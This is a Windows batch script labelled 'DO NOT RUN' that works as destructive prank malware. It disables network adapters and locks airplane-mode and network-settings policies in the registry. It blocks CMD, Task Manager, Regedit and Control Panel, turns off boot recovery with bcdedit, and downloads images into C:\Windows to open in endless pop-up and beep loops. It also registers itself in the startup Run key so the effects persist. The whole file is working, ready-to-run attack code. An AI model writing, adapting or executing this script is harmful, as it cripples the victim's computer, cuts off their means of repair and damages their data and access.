@echo off
title DO NOT RUN
color 4
cls
echo I told you so...
timeout /t 3 >nul

:: Set system year to 9999 (causes lag)
date 12-31-9999
time 23:59:59

:: Disable WiFi and Bluetooth
powershell -Command "Get-NetAdapter | Where-Object {$_.InterfaceDescription -match 'Wi-Fi'} | Disable-NetAdapter -Confirm:$false"
powershell -Command "Get-NetAdapter | Where-Object {$_.InterfaceDescription -match 'Bluetooth'} | Disable-NetAdapter -Confirm:$false"

:: Force Airplane Mode ON (No way to turn it off)
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Wireless\AllowAirplaneMode" /v value /t REG_DWORD /d 0 /f

:: Corrupt the WiFi settings UI
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\SettingsPageVisibility" /v NetworkInternet /t REG_SZ /d hide:network-status /f

:: Disable CMD, PowerShell, Task Manager, Regedit, and Control Panel
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f

:: Disable Windows Recovery Mode (No fixing from boot menu)
bcdedit /set {current} recoveryenabled no

:: Download 10+ memes for eternal suffering
mkdir C:\Windows\MemeHell
powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://i.imgur.com/I7bGZDc.jpg', 'C:\Windows\MemeHell\meme1.jpg')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://i.imgur.com/ZfLd44A.jpg', 'C:\Windows\MemeHell\meme2.jpg')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://i.imgur.com/U2NOF5b.jpg', 'C:\Windows\MemeHell\meme3.jpg')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://i.imgur.com/QjIqF3D.jpg', 'C:\Windows\MemeHell\meme4.jpg')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://i.imgur.com/VrJcURR.jpg', 'C:\Windows\MemeHell\meme5.jpg')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://i.imgur.com/1Xmn3oX.jpg', 'C:\Windows\MemeHell\meme6.jpg')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://i.imgur.com/xBfQmck.jpg', 'C:\Windows\MemeHell\meme7.jpg')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://i.imgur.com/b7G88hb.jpg', 'C:\Windows\MemeHell\meme8.jpg')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://i.imgur.com/UtCgkK6.jpg', 'C:\Windows\MemeHell\meme9.jpg')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://i.imgur.com/akJXZX7.jpg', 'C:\Windows\MemeHell\meme10.jpg')"

:: Loop: Open a random meme every second
start "" powershell -NoProfile -ExecutionPolicy Bypass -Command "& {while ($true) {Start-Process C:\Windows\MemeHell\meme$((Get-Random -Minimum 1 -Maximum 10)).jpg; Start-Sleep -Seconds 1}}"

:: Loop: Play random Windows error sounds every 0.5-1.5 seconds
start "" powershell -NoProfile -ExecutionPolicy Bypass -Command "& {while ($true) {Start-Sleep -Seconds (Get-Random -Minimum 0.5 -Maximum 1.5); [console]::beep(1000, 300)}}"

:: Add this script to Windows startup (ensures chaos continues)
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MemeHell /t REG_SZ /d "%~f0" /f

:: Exit quietly
exit
